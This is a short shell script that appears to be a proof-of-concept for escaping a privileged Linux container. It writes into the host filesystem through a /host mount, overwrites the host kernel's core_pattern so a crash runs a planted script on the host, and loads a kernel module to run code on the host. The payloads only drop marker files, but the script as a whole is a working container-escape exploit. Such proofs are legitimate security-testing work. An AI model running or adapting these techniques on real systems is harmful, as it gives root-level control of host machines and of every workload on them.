#!/bin/sh
# Privileged container-side PoC executor (alpine, POSIX sh).
echo "### poc-in-privileged start $(date -u '+%FT%TZ')  container=$(hostname)"

echo "[poc1] write marker into host root fs via rw /host mount"
echo "escape-poc-marker $(date -u '+%FT%TZ') from container $(hostname)" > /host/tmp/escape-poc-marker
echo "[poc1] marker written: $(cat /host/tmp/escape-poc-marker 2>/dev/null || echo WRITE_FAILED)"

echo "[poc2] overwrite host core_pattern (CAP_SYS_ADMIN + rw /proc/sys in privileged)"
cat > /host/tmp/core-pwn.sh <<'EOS'
#!/bin/sh
echo "core-pattern escape proof $(date -u '+%FT%TZ')" > /tmp/pwned-core-pattern
EOS
chmod +x /host/tmp/core-pwn.sh
if echo '|/bin/sh /tmp/core-pwn.sh %P' > /proc/sys/kernel/core_pattern 2>/dev/null; then
  echo "[poc2] core_pattern set OK: $(cat /proc/sys/kernel/core_pattern)"
else
  echo "[poc2] core_pattern write FAILED (check /proc/sys mount ro)"
fi

echo "[poc3] kernel module insert (CAP_SYS_MODULE), module built on host"
if [ -f /modpoc/escape_poc.ko ]; then
  if insmod /modpoc/escape_poc.ko 2>&1; then
    echo "[poc3] insmod OK (call_usermodehelper should have run on host)"
    rmmod escape_poc 2>/dev/null || true
  else
    echo "[poc3] insmod FAILED (vermagic/format)"
  fi
else
  echo "[poc3] no .ko provided, skipped"
fi
echo "### poc-in-privileged done"
